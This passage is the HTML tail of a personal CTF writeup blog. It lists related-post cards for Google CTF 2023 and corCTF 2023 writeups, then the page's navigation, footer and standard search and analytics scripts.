class="text-muted small"><p> Date: June 12, 2023 rank: 1 team: ProjectSekai It’s the first writeup since joining the ProjectSekai. I joined the second day after CCE (local ctf organized by NIS). I took some reversing and smar...</p></div></div></a></div><div class="card"> <a href="/posts/(ctf)-2023-googlectf/"><div class="card-body"> <em class="timeago small" date="2023-06-26 15:02:13 +0900" >Jun 26, 2023</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) Google CTF 2023 writeup (oldschool, ubf)</h3><div class="text-muted small"><p> oldschool Analyzing the logic, there is a condition that when password is made into a 5x5 matrix and matrix multiplication is performed with a 5x5 matrix made using id after sbox, xor, and shift ro...</p></div></div></a></div><div class="card"> <a href="/posts/(ctf)-2023-corctf/"><div class="card-body"> <em class="timeago small" date="2023-07-31 18:34:08 +0900" >Jul 31, 2023</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) corCTF 2023 writeup (diophantus,babyWallet,utterly-tangled)</h3><div class="text-muted small"><p> corCTF twitter participated with cat :flag_kr: and placed 3rd blockchain/baby-wallet (24 solves) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/(ctf)-b01lers-ctf-956e6a26f4ae423a961e8c221f11b5a2/" class="btn btn-outline-primary" prompt="Older"><p>(CTF) b01lers CTF 2022</p></a> <a href="/posts/(ctf)-hxp-ctf-2022-075e6a0688a84a00b6cae02d2ca19fcb/" class="btn btn-outline-primary" prompt="Newer"><p>(CTF) 2022 hxp required writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/snwo_kr">snwo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web3/">web3</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-H9FVY2NFPZ"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-H9FVY2NFPZ'); }); </script>
